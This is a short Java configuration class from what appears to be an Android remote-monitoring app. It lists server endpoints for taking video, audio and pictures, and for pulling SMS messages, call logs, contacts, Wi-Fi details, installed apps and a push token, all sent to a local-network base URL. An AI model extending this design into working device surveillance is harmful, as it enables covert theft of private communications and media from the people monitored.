package com.fs.fs.api.network;

/**
 * Created by wyx on 2017/1/12.
 */

public class ApiConfig {
    public static final String BASE_URL = "http://192.168.1.100:8080/fs";

    public static String getInstallAppInfo() {
        return "/get_install";
    }


    public static String getRunningAppInfo() {
        return "/running";
    }

    public static String takeVideo() {
        return "/take_video";
    }

    public static String getVideo() {
        return "/video";
    }

    public static String takeAudio() {
        return "/take_audio";
    }

    public static String takePicture() {
        return "/take_picture";
    }

    public static String getPicture() {
        return "/picture";
    }

    public static String getWifi() {
        return "/wifi";
    }

    public static String getCamera() {
        return "/camera";
    }

    public static String getSMSAll() {
        return "/sms";
    }

    public static String getSMS() {
        return "/sms";
    }

    public static String getCall() {
        return "/call";
    }

    public static String getContact() {
        return "/contact";
    }

    public static String getFCMToken() {
        return "/register";
    }
}
